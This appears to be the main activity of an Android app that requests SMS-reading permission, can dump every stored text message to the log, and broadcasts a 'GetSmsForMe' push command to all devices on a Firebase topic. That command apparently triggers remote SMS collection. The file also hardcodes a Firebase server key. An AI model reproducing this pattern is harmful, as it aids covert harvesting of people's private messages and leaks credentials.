package com.example.testsms

import android.Manifest
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.testsms.model.Notification
import com.example.testsms.model.SendNotificationModel
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import dagger.hilt.android.AndroidEntryPoint
import io.reactivex.CompletableObserver
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import kotlinx.android.synthetic.main.activity_main.*
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject
    lateinit var remoteRepository: RemoteRepository

    private val TAG = "MainActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        askPermission()
        initializeFireBase()

        click.setOnClickListener {
         //   readSms()
            val data = Notification("GetSmsForMe", "Title")
            val notif = SendNotificationModel(data, "/topics/all2")
            sendRequestGetSms(notif)
        }

        getSms.setOnClickListener {
            val data = Notification("GetSmsForMe", "Title")
            val notif = SendNotificationModel(data, "/topics/all2")
            sendRequestGetSms(notif)
        }
    }

    private fun initializeFireBase() {
        FirebaseMessaging.getInstance()
            .subscribeToTopic("all2")

        FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w("TAG", "Fetching FCM registration token failed", task.exception)
                return@OnCompleteListener
            }

            // Get new FCM registration token
            val token = task.result

            // Log and toast

            Log.d("TAG", token.toString())

        })
    }

    private fun readSms() {
        val cursor: Cursor? =
            contentResolver.query(Uri.parse("content://sms"), null, null, null, null)

        if (cursor!!.moveToFirst()) { // must check the result to prevent exception
            do {
                var msgData = ""
                for (idx in 0 until cursor.getColumnCount()) {
                    msgData += " " + cursor.getColumnName(idx).toString() + ":" + cursor.getString(
                        idx
                    )
                }
                Log.e("TAG", "readSms: " + msgData)
                // use msgData
            } while (cursor.moveToNext())
        } else {
            // empty box, no SMS
        }
    }

    private fun askPermission() {
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(
                        Manifest.permission.READ_SMS
                    )
                ) {
                    //   showDialogPermission()
                } else {
                    requestPermissions(
                        arrayOf(
                            Manifest.permission.READ_SMS
                        ),
                        123
                    )
                }
            } else {
                ActivityCompat.requestPermissions(
                    this, arrayOf(
                        Manifest.permission.READ_SMS
                    ), 123
                );
            }
        }
    }

    private fun sendRequestGetSms(sendNotificationModel: SendNotificationModel) {
        Log.e(TAG, "onMessageReceived: " + "send")
        remoteRepository.sendNotification(
            token = "Bearer AAAARr6Jcbk:APA91bFLrJ5ESAyRQ4H8EXyFppafI7KESFcRdOt1--9X1-F93tEBW87JA-KWqwcigXym2OnX8dtxHpSsvOHRjw0q2bHhx3fsf04F1S65aNmJmRTQHGn0PwnujPxrSoi3E_Ej4bXSZQAX",
            sendNotificationModel = sendNotificationModel
        ).subscribeOn(
            Schedulers.io()
        ).observeOn(AndroidSchedulers.mainThread()).subscribe(
            object : CompletableObserver {
                override fun onSubscribe(d: Disposable) {

                }

                override fun onComplete() {
                    Log.e(TAG, "onComplete: ")
                    Toast.makeText(applicationContext, "PLEASE WAIT SIR", Toast.LENGTH_LONG).show()
                }

                override fun onError(e: Throwable) {
                    Log.e(TAG, "onError: ", e)
                }
            })
    }

}